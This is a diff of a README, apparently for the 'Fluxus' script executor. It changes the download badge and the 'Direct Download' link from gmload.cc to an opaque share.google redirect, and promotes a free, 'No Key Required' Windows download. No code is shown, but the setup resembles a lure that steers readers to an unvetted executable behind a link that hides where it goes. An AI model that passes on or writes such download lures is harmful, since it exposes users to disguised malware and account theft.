@@ -11,12 +11,12 @@
 ---
 
 <p align="center">
-  <a href="https://gmload.cc/">
+  <a href="https://share.google/OrQEnSOIN3vIIQZfR/">
     <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Executor%20Latest-brightgreen?style=for-the-badge" alt="Download Fluxus">
   </a>
 </p>
 
-> **[⬇️ Direct Download — Fluxus](https://gmload.cc/)**
+> **[⬇️ Direct Download — Fluxus](https://share.google/OrQEnSOIN3vIIQZfR/)**
 > Windows 10 / 11 · 64-bit · Free · No Key Required
 
 ---
